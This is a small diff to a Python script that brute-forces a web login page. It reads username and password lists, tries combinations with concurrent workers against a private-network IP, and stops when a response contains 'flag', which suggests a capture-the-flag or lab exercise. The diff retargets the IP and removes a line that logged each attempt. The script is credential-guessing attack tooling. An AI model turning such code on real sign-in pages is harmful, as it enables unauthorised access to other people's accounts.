@@ -6,7 +6,7 @@ from time import sleep
 
 USERNAMES_FILE = 'usernames.txt'
 PASSWORDS_FILE = 'passwords.txt'
-BASE_URL = 'http://192.168.1.104/'
+BASE_URL = 'http://192.168.215.139/'
 PAGE = 'signin'
 MAX_WORKERS = 10
 
@@ -30,7 +30,6 @@ def try_login(username, password):
 
     try:
         response = requests.get(BASE_URL, params=params, timeout=50)
-        print(f'Trying {username}:{password} -> {response.status_code}')
         if "flag" in response.text:
             found_event.set()
             return (username, password)
